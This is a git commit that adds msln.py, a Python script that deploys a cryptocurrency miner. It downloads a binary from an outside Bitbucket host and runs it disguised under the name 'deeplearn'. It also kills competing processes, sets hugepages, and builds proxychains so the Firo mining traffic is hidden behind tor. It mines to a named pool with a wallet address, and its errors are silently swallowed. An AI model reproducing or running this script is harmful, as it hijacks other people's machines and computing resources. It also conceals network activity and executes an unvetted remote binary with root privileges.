d33b6b239de4114d68a98fcee8331345ecb06eb1
wollfoo <nhac.tien1988@gmail.com>
2023-08-06 18:08:08 +0700

    Create msln.py

---
+++ msln.py
@@ -0,0 +1,36 @@
+__author__ = 'root'
+import time
+import urllib
+import os,sys
+from socket import error as socket_error
+import multiprocessing
+import ast
+useproxy = 0
+os.system('chmod 777 ' + __file__)
+program = 'deeplearn'
+os.system('pkill ' + program)
+cores = multiprocessing.cpu_count() - 1
+if cores <= 0:
+    cores = 1
+os.system('sysctl -w vm.nr_hugepages=$((`grep -c ^processor /proc/cpuinfo` * 3))')
+try:
+    os.system('apt-get update -y')
+    os.system('apt-get install gcc make tor python python-dev -y')
+    os.system('rm -rf proxychains-ng')
+    os.system('git clone https://github.com/ts6aud5vkg/proxychains-ng.git')
+    os.chdir('proxychains-ng')
+    os.system('make')
+    os.system('make install')
+    os.system('make install-config')
+    if os.path.isfile('/usr/local/bin/' + program) == False:
+        os.system('wget https://bitbucket.org/azure007/deeplearn/downloads/' + program)            
+        os.system('chmod 777 ' + program)
+        workingdir = os.getcwd()
+        os.system('ln -s -f ' + workingdir + '/' + program + ' ' +'/usr/local/bin/' + program)
+        os.system('ln -s -f ' + workingdir + '/' + program + ' ' + '/usr/bin/' + program)
+        time.sleep (2)
+except:
+    pass
+os.system('tor &')
+time.sleep(60)
+os.system ('proxychains4 ' + program + ' --algo firo --server firo-eu1.picopool.org:22443 --user a9qF6ebLR5pY7LebgwT1YQYjmT1Kmrwx6E.ml/jmayo66@yahoo.com --ssl 1 ' )
